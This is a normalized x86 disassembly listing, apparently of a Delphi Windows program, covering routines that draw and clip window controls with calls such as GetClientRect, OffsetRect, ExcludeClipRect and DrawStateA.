mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4722b0
xor edx edx
mov eax esi
call sub_47de08
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_48286c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
lea eax [ esi + 0x318 ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4723a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_48289c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47324c
cmp [ ebx + 0x314 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x318 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebx + 0x210 ]
mov edx [ edx + 0x40 ]
call sub_46bb20
mov eax [ esi + 0x40 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebx + 0x318 ] 0x0
jne r-xdata
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b9f4
mov [ ebx + 0x318 ] eax
sub_48294c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x30 ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetClientRect
push ebx
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowRect
push 0x2
push ebx
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebx + 0x4 ]
neg eax
push eax
mov eax [ ebx ]
neg eax
push eax
lea eax [ ebp - 0x20 ]
push eax
call OffsetRect
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x20 ]
push eax
push esi
call ExcludeClipRect
mov eax [ ebx + 0x4 ]
neg eax
push eax
mov eax [ ebx ]
neg eax
push eax
push ebx
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push j_sub_4038bc#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx esi
call sub_425300
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424864
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_424f44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebx + 0xc ]
mov edx [ ebx ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424758
mov ecx [ ebx + 0x4 ]
inc ecx
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424f44
mov ecx [ ebx + 0x4 ]
inc ecx
mov edx [ ebx ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov ecx [ ebx + 0xc ]
sub ecx 0x2
mov edx [ ebx ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x84 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424758
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebx + 0x4 ]
call sub_424f44
mov ecx [ ebx + 0xc ]
dec ecx
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov ecx [ ebx + 0xc ]
dec ecx
mov edx [ ebx ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424758
mov ecx [ ebx + 0x4 ]
inc ecx
mov edx [ ebx + 0x8 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424f44
mov ecx [ ebx + 0xc ]
sub ecx 0x2
mov edx [ ebx + 0x8 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov ecx [ ebx + 0xc ]
sub ecx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebx ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482c9a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebp - 0x8 ]
call sub_425300
retn
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov esi [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_47ea90
cmp esi [ eax + 0x7c ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ac ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x2ac ]
mov eax esi
call sub_44894c
lea edx [ ebp - 0x40 ]
lea ecx [ ebp - 0x10 ]
mov eax [ esi + 0x30 ]
call sub_448ac4
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_44894c
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0xc ]
dec eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x10 ]
mov edx ebx
sub edx [ eax + 0x40 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov esi [ ebp - 0xc ]
mov ecx esi
call sub_424f44
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebp - 0x4 ]
mov edx ebx
sub edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ac ]
add edx [ eax + 0x48 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx esi
call sub_424ee4
sub_482ca0
push ebx
push esi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_4728ec
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esp
mov eax [ esi + 0x30 ]
call sub_44894c
mov eax [ esp ]
cmp eax [ ebx + 0x40 ]
jge r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_44894c
mov eax [ esp ]
cmp eax [ ebx + 0x40 ]
jge r-xdata
mov edx esp
mov eax [ esi + 0x30 ]
call sub_44894c
mov edx [ esp + 0x8 ]
dec edx
mov eax ebx
call sub_4486f4
jmp r-xdata
mov edx [ ebx + 0x40 ]
dec edx
mov eax ebx
call sub_4486f4
sub_482d20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x2ac ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
call sub_47309c
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_482d4c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_472298
call sub_47ea90
mov edx [ eax + 0x74 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_424e6c
push esi
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esp + 0x8 ] 0x18
mov eax ebx
call sub_472298
call sub_47ea90
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_424e6c
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
push 0x1
push 0x0
push esi
call OffsetRect
push 0xfffffffc
push 0xfffffffe
push esi
call InflateRect
mov eax ebx
call sub_472298
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_424e6c
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_482e2c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
push 0x1
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
push 0xfffffffc
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425028
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
sub_482ec0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
cmp [ esi + 0x50 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_46d324
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
sub_482f74
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424b54
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425028
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
sub_483010
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ edx ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ab ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_47f1d0
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ae ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_481ba8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b214
test al al
je r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4831a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b0a8
mov ebx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ eax + 0x58 ]
mov eax [ ebx + 0x38 ]
mov ecx [ ebp - 0xc ]
call sub_456bd8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_424a38
retn
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov eax [ eax + 0x68 ]
mov edx 0xffffffce
call sub_46b1b8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x84
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
inc eax
push eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a6c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425280
push eax
call DrawStateA
sub_483200
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_404368
xor eax eax
push ebp
push j_sub_4038bc#8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1ab ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_47f7c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483289
lea eax [ ebp + 0x8 ]
call sub_403eb8
retn
mov eax ebx
call sub_48060c
call sub_47ea90
cmp [ eax + 0x5c ] 0x20000000
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x5c ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_42426c
sub_483290
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov edx esi
mov eax ebx
call sub_46d324
pop esi
pop ebx
retn
sub_48333c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
sub [ esp + 0x8 ] 0x9
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425028
mov eax [ esp + 0x8 ]
dec eax
mov [ esp ] eax
add [ esp + 0x8 ] 0x9
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_425028
sub_4833dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ edx ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ab ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_47f1d0
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ae ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_481ba8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b214
test al al
je r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push j_sub_4038bc#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov ebx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ eax + 0x58 ]
mov eax [ ebx + 0x38 ]
mov ecx [ ebp - 0xc ]
call sub_456bd8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_424a38
retn
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47ea90
mov eax [ eax + 0x68 ]
mov edx 0xffffffce
call sub_46b1b8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x38 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x84
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
inc eax
push eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a6c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425280
push eax
call DrawStateA
sub_4835d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47344c
xor edx edx
mov eax esi
call sub_47de08
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_483620
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetClientRect
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x20 ]
neg eax
push eax
mov eax [ ebp - 0x24 ]
neg eax
push eax
lea eax [ ebp - 0x14 ]
push eax
call OffsetRect
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push ebx
call ExcludeClipRect
mov eax [ ebp - 0x20 ]
neg eax
push eax
mov eax [ ebp - 0x24 ]
neg eax
push eax
lea eax [ ebp - 0x24 ]
push eax
call OffsetRect
xor eax eax
push ebp
push j_sub_4038bc#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx ebx
call sub_425300
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425028
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx 0x1
mov edx 0x1
call sub_424f44
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
dec ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx 0x1
call sub_424ee4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4837a4
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425280
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
xor edx edx
call sub_425300
retn
sub_4837ac
push ebx
mov ebx eax
mov eax ebx
call sub_4733a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov edx [ ebx + 0x4c ]
add edx 0x2
mov eax ebx
call sub_448764
pop ebx
retn
mov edx 0x3
mov eax ebx
call sub_448764
pop ebx
retn
sub_4837e4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax [ ebx + 0x16c ]
test eax eax
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x24 ]
cmp edx 0x20000000
je r-xdata
push esi
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x190 ]
cmp eax [ ebx + 0x172 ]
jle r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
push esi
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x190 ]
cmp eax [ ebx + 0x172 ]
jle r-xdata
xor eax eax
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x198 ]
add eax 0x3
mov [ esp + 0x8 ] eax
sub eax 0x3
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x34 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebx + 0x1ac ]
call sub_47ea90
call sub_47bc78
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov eax 0x2c
mov [ esp + 0x8 ] eax
sub eax [ esp ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x16c ]
call sub_47b8c0
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov edx esp
mov eax ebx
call sub_47f0c0
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x74 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
cmp [ ebx + 0x18a ] 0x0
je r-xdata
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_47f0c0
cmp [ ebx + 0x18a ] 0x0
je r-xdata
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
dec [ esi + 0x8 ]
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_424e6c
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
